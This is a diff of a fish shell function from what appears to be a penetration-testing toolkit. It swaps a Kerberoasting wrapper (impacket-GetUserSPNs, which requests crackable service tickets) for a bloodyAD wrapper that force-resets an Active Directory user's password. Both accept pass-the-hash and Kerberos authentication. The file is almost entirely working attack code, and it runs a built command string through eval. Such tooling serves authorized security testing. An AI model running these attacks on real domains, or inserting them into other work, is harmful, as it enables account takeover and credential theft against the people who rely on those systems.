@@ -1,22 +1,22 @@
-# description: Run Kerberoasting using impacket-GetUserSPNs
-function _kronos_kerbroast --description "Run Kerberoasting using impacket-GetUserSPNs"
-    argparse h/help u/username= p/password= H/hash= d/domain= t/target= k/kerberos -- $argv
+# description: Force change a user's password using bloodyAD
+function _kronos_forcechange --description "Force change a user's password using bloodyAD"
+    argparse h/help u/username= p/password= H/hash= t/target-user= P/new-password= k/kerberos -- $argv
     or return 1
 
     if set -q _flag_help
-        echo "Usage: kronos kerbroast [DC_IP] [OPTIONS]"
+        echo "Usage: kronos forcechange [TARGET] [OPTIONS]"
         echo ""
-        echo "Run Kerberoasting using impacket-GetUserSPNs."
+        echo "Force change a user's password using bloodyAD."
         echo ""
         echo "Arguments:"
-        echo "  DC_IP               DC IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
+        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC or \$TGT)"
         echo ""
         echo "Options:"
         echo "  -u, --username USER Provide username for authentication"
         echo "  -p, --password PASS Provide password for authentication"
         echo "  -H, --hash HASH     Provide NTLM hash for authentication"
-        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_AD_DOMAIN)"
-        echo "  -t, --target USER   Only roast this specific user (defaults to all users)"
+        echo "  -t, --target-user U Target user whose password will be changed"
+        echo "  -P, --new-password  The new password to set"
         echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
         echo "  -h, --help          Show this help message"
         return 0
@@ -30,18 +30,18 @@ function _kronos_kerbroast --description "Run Kerberoasting using impacket-GetUs
             set target $TGT
         else
             echo "Error: Target IP/hostname/nameserver is required." >&2
-            echo "Usage: kronos kerbroast [TARGET] [OPTIONS]" >&2
+            echo "Usage: kronos forcechange [TARGET] [OPTIONS]" >&2
             return 1
         end
     end
 
-    set -l domain ""
-    if set -q _flag_domain
-        set domain $_flag_domain
-    else if test -n "$TGT_AD_DOMAIN"
-        set domain $TGT_AD_DOMAIN
-    else
-        echo "Error: Domain is required. Provide it via -d/--domain or ensure TGT_AD_DOMAIN is set." >&2
+    if not set -q _flag_target_user
+        echo "Error: Target user (-t/--target-user) is required." >&2
+        return 1
+    end
+
+    if not set -q _flag_new_password
+        echo "Error: New password (-P/--new-password) is required." >&2
         return 1
     end
 
@@ -81,28 +81,34 @@ function _kronos_kerbroast --description "Run Kerberoasting using impacket-GetUs
         return 1
     end
 
-    if not command -s impacket-GetUserSPNs >/dev/null
-        echo "Error: impacket-GetUserSPNs not found in PATH." >&2
+    set -l domain ""
+    if test -n "$TGT_AD_DOMAIN"
+        set domain $TGT_AD_DOMAIN
+    else
+        echo "Error: TGT_AD_DOMAIN is not set." >&2
         return 1
     end
 
-    set -l cmd_str "impacket-GetUserSPNs \"$domain/$auth_user"
+    if not command -s bloodyAD >/dev/null
+        echo "Error: bloodyAD not found in PATH." >&2
+        return 1
+    end
+
+    set -l cmd_str "bloodyAD --host \"$target\" -d \"$domain\""
+
     if set -q _flag_kerberos
-        set cmd_str "$cmd_str\" -k"
-    else if test -n "$auth_hash"
-        set cmd_str "$cmd_str\" -hashes \"$auth_hash\""
+        set cmd_str "$cmd_str -k"
     else
-        set cmd_str "$cmd_str:$auth_pass\""
-    end
-    set cmd_str "$cmd_str -dc-ip \"$target\""
-
-    if set -q _flag_target
-        echo "Running impacket-GetUserSPNs against $target to Kerberoast user $_flag_target..."
-        set cmd_str "$cmd_str -request-user \"$_flag_target\""
-    else
-        echo "Running impacket-GetUserSPNs against $target to Kerberoast all users..."
-        set cmd_str "$cmd_str -request"
+        set cmd_str "$cmd_str -u \"$auth_user\""
+        if test -n "$auth_hash"
+            set cmd_str "$cmd_str -p \":$auth_hash\""
+        else
+            set cmd_str "$cmd_str -p \"$auth_pass\""
+        end
     end
 
+    set cmd_str "$cmd_str set password \"$_flag_target_user\" \"$_flag_new_password\""
+
+    echo "Running bloodyAD to change password for $_flag_target_user..."
     eval $cmd_str
 end
